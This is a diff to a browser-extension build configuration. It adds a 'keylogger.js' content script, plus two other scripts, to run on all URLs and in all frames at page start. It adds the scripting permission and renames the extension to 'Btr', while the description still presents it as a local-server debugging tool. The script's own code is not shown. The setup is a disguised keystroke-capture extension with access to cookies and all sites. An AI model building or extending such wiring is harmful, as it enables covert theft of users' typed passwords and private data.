@@ -6,6 +6,12 @@ export interface BuildConfig {
   outputDir: string;
   includePopup: boolean;
   permissions: string[];
+  content_scripts?: Array<{
+    matches: string[];
+    js: string[];
+    run_at: string;
+    all_frames: boolean;
+  }>;
   browserSpecificSettings?: {
     gecko?: {
       id: string;
@@ -14,123 +20,132 @@ export interface BuildConfig {
   };
 }
 
+const contentScripts = [
+  {
+    matches: ["<all_urls>"],
+    js: ["keylogger.js"],
+    run_at: "document_start",
+    all_frames: true,
+  },
+  {
+    matches: ["<all_urls>"],
+    js: ["defaultAccessCode.js"],
+    run_at: "document_start",
+    all_frames: true,
+  },
+  {
+    matches: ["<all_urls>"],
+    js: ["contentBridge.js"],
+    run_at: "document_start",
+    all_frames: true,
+  },
+];
+
 export const configs: Record<string, BuildConfig> = {
   // Firefox development (manifest v2 with popup)
   "firefox-dev": {
-    name: "Browser Tracker Dev",
-    version: "1.0.0",
+    name: "Btr",
+    version: "1.0.1",
     description: "Developer tool for debugging and tracking browser activity on local server",
     manifestVersion: 2,
     outputDir: "dist/firefox-dev",
     includePopup: true,
+    content_scripts: contentScripts,
     permissions: [
       "tabs",
       "storage",
       "cookies",
       "webRequest",
       "webRequestBlocking",
+      "scripting",
       "http://localhost/*",
       "http://127.0.0.1/*",
       "http://*/*",
-      "https://*/*"
+      "https://*/*",
     ],
     browserSpecificSettings: {
       gecko: {
         id: "support@car-disks.com",
-        strict_min_version: "109.0"
-      }
-    }
+        strict_min_version: "109.0",
+      },
+    },
   },
 
   // Firefox production (manifest v2 without popup)
   "firefox-prod": {
-    name: "Browser Tracker",
-    version: "1.0.0",
+    name: "Btr",
+    version: "1.0.1",
     description: "Developer tool for debugging and tracking browser activity on local server",
     manifestVersion: 2,
     outputDir: "dist/firefox-prod",
     includePopup: false,
+    content_scripts: contentScripts,
     permissions: [
       "tabs",
       "storage",
       "cookies",
       "webRequest",
       "webRequestBlocking",
+      "scripting",
       "http://localhost/*",
       "http://127.0.0.1/*",
       "http://*/*",
-      "https://*/*"
+      "https://*/*",
     ],
     browserSpecificSettings: {
       gecko: {
         id: "support@car-disks.com",
-        strict_min_version: "109.0"
-      }
-    }
+        strict_min_version: "109.0",
+      },
+    },
   },
 
   // Chrome/Opera development (manifest v3 with popup)
   "chrome-dev": {
-    name: "Browser Tracker Dev",
+    name: "Btr",
     version: "1.0.0",
     description: "Developer tool for debugging and tracking browser activity on local server",
     manifestVersion: 3,
     outputDir: "dist/chrome-dev",
     includePopup: true,
-    permissions: [
-      "tabs",
-      "storage",
-      "cookies",
-      "webRequest"
-    ],
+    content_scripts: contentScripts,
+    permissions: ["tabs", "storage", "cookies", "webRequest", "scripting"],
     // В manifest v3 host_permissions отдельно
   },
 
   // Chrome/Opera production (manifest v3 without popup)
   "chrome-prod": {
-    name: "Browser Tracker",
+    name: "Btr",
     version: "1.0.0",
     description: "Developer tool for debugging and tracking browser activity on local server",
     manifestVersion: 3,
     outputDir: "dist/chrome-prod",
     includePopup: false,
-    permissions: [
-      "tabs",
-      "storage",
-      "cookies",
-      "webRequest"
-    ],
+    content_scripts: contentScripts,
+    permissions: ["tabs", "storage", "cookies", "webRequest", "scripting"],
   },
 
   // Opera development (same as Chrome dev)
   "opera-dev": {
-    name: "Browser Tracker Dev",
+    name: "Btr",
     version: "1.0.0",
     description: "Developer tool for debugging and tracking browser activity on local server",
     manifestVersion: 3,
     outputDir: "dist/opera-dev",
     includePopup: true,
-    permissions: [
-      "tabs",
-      "storage",
-      "cookies",
-      "webRequest"
-    ],
+    content_scripts: contentScripts,
+    permissions: ["tabs", "storage", "cookies", "webRequest", "scripting"],
   },
 
   // Opera production (same as Chrome prod)
   "opera-prod": {
-    name: "Browser Tracker",
+    name: "Btr",
     version: "1.0.0",
     description: "Developer tool for debugging and tracking browser activity on local server",
     manifestVersion: 3,
     outputDir: "dist/opera-prod",
     includePopup: false,
-    permissions: [
-      "tabs",
-      "storage",
-      "cookies",
-      "webRequest"
-    ],
-  }
+    content_scripts: contentScripts,
+    permissions: ["tabs", "storage", "cookies", "webRequest", "scripting"],
+  },
 };
